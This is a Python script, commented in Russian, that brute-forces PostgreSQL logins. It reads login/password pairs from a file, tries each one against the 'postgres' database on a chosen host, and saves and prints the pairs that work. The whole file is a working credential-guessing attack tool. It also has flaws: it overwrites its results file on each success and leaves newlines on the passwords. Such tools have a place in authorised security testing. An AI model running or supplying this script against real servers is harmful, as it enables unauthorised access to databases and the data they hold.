import psycopg2
import time
import argparse


# Ввод данных для подключения к БД
def get_args():
    """
    Параметры для подключения
    """
    parser = argparse.ArgumentParser(
        description='Параметры для подключения к БД PostgreSQL', add_help=False)
    parser.add_argument('-h', '--host', required=True, action='store',
                        help='Адрес сервера')
    parser.add_argument('-p', '--port', type=int, default=5432, action='store',
                        help='Порт для подключения')
    parser.add_argument('-c', '--datafile', required=True, action='store',
                        help='Путь к файлу с логинами/паролями')
    args = parser.parse_args()
    return args


def connect_to_postgresql():
    args = get_args()

    # Открытие файла с данными для перебора
    filename = args.datafile
    with open(filename, 'r') as f:
        lines = f.readlines()

    # Инициализация счетчика успешных подключений
    success_count = 0

    # Инициализация списка ошибок
    errors = []

    # Список баз для подключения
    dbs = ["postgres"]

    for db in dbs:
        # Проход по всем комбинациям логинов и паролей
        for line in lines:
            login, password = line.split(' ')

            try:
                # Подключение к БД
                conn = psycopg2.connect(
                    host=args.host,
                    port=int(args.port),
                    dbname=db,
                    user=login,
                    password=password
                )

                # Добавление успешного подключения в файл
                with open("passwords.txt", "w") as passwords_file:
                    passwords_file.write(f"{login} {password}\n")
                success_count += 1

                # Закрытие соединения
                conn.close()

            except Exception:
                errors.append(f"Ошибка подключения к БД {db} с login и pass: {login}/{password}")

    # Вывод сообщения об успешных подключениях
    print(f"Успешно подобрано {success_count} УЗ:")

    # Печать списка успешных соединений
    with open("passwords.txt", "r") as passwords_file:
        print(passwords_file.read())

    # Печать списка ошибок, если они есть
    if len(errors) > 0:
        print("Ошибки при попытке подключения:")
        for error in errors:
            print(error)

    # Вывод сообщения, если ни один логин/пароль не был подобран
    if success_count == 0:
        print("Не удалось подобрать ни один логин/пароль")


# Фиксация времени начала работы скрипта
start_time = time.time()

connect_to_postgresql()

# Вывод общего времени работы скрипта
print(f"Время выполнения скрипта: {time.time() - start_time} секунд")
